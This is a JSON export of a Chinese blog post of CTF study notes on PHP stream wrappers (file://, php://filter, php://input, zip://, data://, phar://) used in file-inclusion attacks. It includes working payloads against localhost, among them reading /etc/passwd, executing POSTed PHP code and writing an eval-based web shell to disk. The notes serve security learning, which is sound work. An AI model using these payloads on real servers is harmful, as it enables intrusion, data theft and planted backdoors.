{"title":"PHP伪协议","uid":"c6ac16b2709d97469cc89f64776332bb","slug":"PHP伪协议","date":"2020-10-09T12:12:55.000Z","updated":"2020-10-10T09:07:50.000Z","comments":true,"path":"api/articles/PHP伪协议.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"file-协议\"><a href=\"#file-协议\" class=\"headerlink\" title=\"file://协议\"></a>file://协议</h2><h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>allow_url_fopen:off/on</li>\n<li>allow_url_include:off/on</li>\n</ul>\n<h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_include的影响。</p>\n<p>这里有一点，当PHP里使用include()/require()/include_once()/require_once()参数可控的情况下，如导入一个非<code>.php</code>的文件，依然回按照php语法进行解析，这是include()函数的结果。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>file://文件系统是PHP使用的默认封装协议，展示了本地文件系统，file://它是使用了相对路径，一般来说脚本目录在什么目录下，其的起始路径就是改目录了。除非特意对默认路径做了修改，使用CLI的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen()和file_get_contents()、include_path会可选地进行搜索，也作为相对的路径。</p></blockquote>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p><strong>file://文件的绝对路径和文件名</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/10/0y6ZlQ.png\" alt=\"0y6ZlQ.png\"></p>\n<p><strong>文件的相对路径和文件名</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;.&#x2F;index.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/10/0y6tX9.png\" alt=\"0y6tX9.png\"></p>\n<p><strong>http://文件路径和文件名</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"php-协议\"><a href=\"#php-协议\" class=\"headerlink\" title=\"php://协议\"></a>php://协议</h2><h3 id=\"利用条件-1\"><a href=\"#利用条件-1\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>allow_url_fopen:off/on</li>\n<li>allow_url_include:on/off</li>\n</ul>\n<p>其中仅有php://input、php://stdin、php://memory、php://temp需要on</p>\n<h3 id=\"作用-1\"><a href=\"#作用-1\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>php://访问各个I/O streams,平时在CTF中经常使用的就是php://input、php://filter,其中用php://filter读取源代码，而php://input用来做php代码执行。</p>\n<h3 id=\"php-filter的使用\"><a href=\"#php-filter的使用\" class=\"headerlink\" title=\"php://filter的使用\"></a>php://filter的使用</h3><p>该协议的参数会在该协议的路径上进行传递，多个参数都可以使用。</p>\n<table>\n<thead>\n<tr>\n<th>常用参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>resource=&lt;过滤的数据流&gt;</td>\n<td>这个必须要设置，没有它就过滤不到数据流。</td>\n</tr>\n<tr>\n<td>read=&lt;读链的过滤器&gt;</td>\n<td>这是一个可选，但是一般还是很经常用到，例如read=convert.base64-encode来base64编码过滤流</td>\n</tr>\n<tr>\n<td>write=&lt;写链的过滤器&gt;</td>\n<td>这也是一个可选，可以设置一个或者多个过滤器名称。</td>\n</tr>\n<tr>\n<td>&lt;;两个链的过滤器&gt;</td>\n<td>任何没有以read=或这write=作为前缀的过滤器列表会根据实际情况用于read或write</td>\n</tr>\n</tbody></table>\n<p>下面看看过滤器,种类比较多，记录如下，有些时候忘了可以方面查看：</p>\n<table>\n<thead>\n<tr>\n<th>字符串过滤器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>string.rot13</td>\n<td>rot编码字符</td>\n</tr>\n<tr>\n<td>string.toupper</td>\n<td>把所有字符转换成大写</td>\n</tr>\n<tr>\n<td>string.tolower</td>\n<td>把所有支付转换成小写</td>\n</tr>\n<tr>\n<td>string.strip_tags</td>\n<td>出去字符中的php标签和html标签</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>转换过滤器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>convert.base64-encode &amp; convert.base64-decode</td>\n<td>做base64编码和解码</td>\n</tr>\n<tr>\n<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>\n<td>quoted-printable字符和八位二进制编码和解码</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>加密过滤器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mcrypt.*</td>\n<td>libmcript对称加密算法</td>\n</tr>\n<tr>\n<td>medecrypt.*</td>\n<td>libmcrypt对称加密算法</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>压缩过滤器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>zlib.deflate &amp; zlib.inflate</td>\n<td>在本地文件系统中创建gzip兼容文件的方法，但不产生命令行工具例如gzip的头和尾部信息。只是压缩和解压数据流中有效的负荷部分</td>\n</tr>\n<tr>\n<td>bzip.compress &amp; bzip2.decompress</td>\n<td>和上面一样，在本地文件系统中创建bz2兼容文件的方法。</td>\n</tr>\n</tbody></table>\n<h3 id=\"例子-1\"><a href=\"#例子-1\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p><strong>php://filter/read=convert.base64-encode/resource=文件名</strong></p>\n<p>用于读取文件源代码，如果目标对象是一个PHP文件需要对PHP文件去做一个base64编码才行。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>php://input</strong></p>\n<p>这个也经常使用，当你想要执行你POST传入的php代码就排上用场了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input\n\n&lt;?php system(&#39;ls&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>说到这个，还是burpsuit抓包改包靠谱，最近不知道为什么hackbar它抽风了，post发布出去全变get了。既然可以执行代码，只要权限配合，你可以写马。</p>\n<p>比如这样：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input\n\n&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39;; ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"zip-amp-bzip2-amp-zlib-协议\"><a href=\"#zip-amp-bzip2-amp-zlib-协议\" class=\"headerlink\" title=\"zip:// &amp; bzip2:// &amp; zlib://协议\"></a>zip:// &amp; bzip2:// &amp; zlib://协议</h2><h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ul>\n<li>allow_url_fopen:off/on</li>\n<li>allow_url_include:off/on</li>\n</ul>\n<h3 id=\"作用-2\"><a href=\"#作用-2\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>zip:// &amp; bzip2:// &amp; zlib://协议都是属于压缩流，可以访问压缩文件中的子文件，而且可以不指定后缀，可以修改为任意后缀。</p>\n<h3 id=\"例子-2\"><a href=\"#例子-2\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p><strong>zip://压缩文件的绝对路径%23压缩文件内的子文件名</strong></p>\n<p>%23是什么就不用说了吧，天天见。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;zip:&#x2F;&#x2F;&#x2F;home&#x2F;a1andns&#x2F;PHP&#x2F;平时测试&#x2F;flag.jpg%23flag.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里的意思是压缩文件flag.txt成flag.zip,压缩包改名为flag.jpg，并且上传。</p>\n<p><strong>compress.bzip2://file.bz2</strong></p>\n<p>这个是压缩文件为file.bz2并且上传，注意也是绝对路径</p>\n<p><strong>compress.zlib://file.gz</strong></p>\n<p>压缩文件为file.gz并且上传，注意也是绝对路径</p>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data://协议\"></a>data://协议</h2><h3 id=\"条件-1\"><a href=\"#条件-1\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ul>\n<li>allow_url_fopen:on</li>\n<li>allow_url_include:on</li>\n</ul>\n<h3 id=\"作用-3\"><a href=\"#作用-3\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>data://数据流封装器是从php5.2.0开始使用的。以此传递相应的格式的数据。经常被用来执行PHP代码。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain,\ndata:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"例子-3\"><a href=\"#例子-3\" class=\"headerlink\" title=\"例子\"></a>例子</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"http-amp-https-协议\"><a href=\"#http-amp-https-协议\" class=\"headerlink\" title=\"http:// &amp; https://协议\"></a>http:// &amp; https://协议</h2><h3 id=\"条件-2\"><a href=\"#条件-2\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ul>\n<li>allow_url_fopen:on</li>\n<li>allow_url_include:on</li>\n</ul>\n<h3 id=\"作用-4\"><a href=\"#作用-4\" class=\"headerlink\" title=\"作用\"></a>作用</h3><p>这两个协议大家都很熟了，就是常规的URL格式，允许用过HTTP 1.0的GET方式去访问只读文件或者资源。常用于远程包含。可能导致ssrf的执行。</p>\n<h3 id=\"例子-4\"><a href=\"#例子-4\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p><a href=\"http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p>\n<h2 id=\"phar-协议\"><a href=\"#phar-协议\" class=\"headerlink\" title=\"phar://协议\"></a>phar://协议</h2><p>phar://协议与zip://协议类似，也可以用来访问zip压缩包内容，但是这个phar没有那么简单，在2018年的black hat大会上，研究人员展示了一种针对PHP的全新攻击手段，phar://协议对象注入技术，这和反序列化又扯上了关系了。这里我觉得可以单独再写一篇博客，结合一些资料学习一下，最近的CTF中也出现了phar://协议结合反序列化去打对象注入的，例如巅峰极客2020的BABYPHP2就是这种类型的。</p>\n","text":"file://协议利用条件 allow_url_fopen:off/on allow_url_include:off/on 作用使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_i...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":35,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"PHP","slug":"PHP","count":8,"path":"api/tags/PHP.json"},{"name":"协议","slug":"协议","count":1,"path":"api/tags/协议.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#file-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">file:&#x2F;&#x2F;协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90\"><span class=\"toc-text\">例子</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">php:&#x2F;&#x2F;协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8-1\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php-filter%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">php:&#x2F;&#x2F;filter的使用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90-1\"><span class=\"toc-text\">例子</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#zip-amp-bzip2-amp-zlib-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8-2\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90-2\"><span class=\"toc-text\">例子</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#data-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">data:&#x2F;&#x2F;协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6-1\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8-3\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90-3\"><span class=\"toc-text\">例子</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#http-amp-https-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6-2\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8-4\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%AD%90-4\"><span class=\"toc-text\">例子</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#phar-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">phar:&#x2F;&#x2F;协议</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"西湖论剑2020复现","uid":"0c2fa944cd89422ab54a5eca03b47d0e","slug":"西湖论剑2020复现","date":"2020-10-12T08:15:37.000Z","updated":"2020-10-13T04:03:18.000Z","comments":true,"path":"api/articles/西湖论剑2020复现.json","keywords":"A1andNS","cover":[],"text":"今天NU1L和ChaMD5出了Web的WP，赶紧趁热复现一手。 hardxss这题只有两个功能点，一个是子域名爆破，一个是联系站长。试了一下子域名爆破就是个幌子，关键应该在于联系站长的功能。 嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"西湖论剑之easyjson","uid":"b6ef90df0d5401009a96a4d7a8cf8b92","slug":"西湖论剑之easyjson","date":"2020-10-09T11:41:27.000Z","updated":"2020-10-09T11:49:32.000Z","comments":true,"path":"api/articles/西湖论剑之easyjson.json","keywords":"A1andNS","cover":[],"text":"[西湖论剑2020] EasyJson考点：代码审计 &lt;?php include 'security.php'; if(!isset($_GET['source']))&#123; show_source(__FILE__); die(); &#125; $sandbox ...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}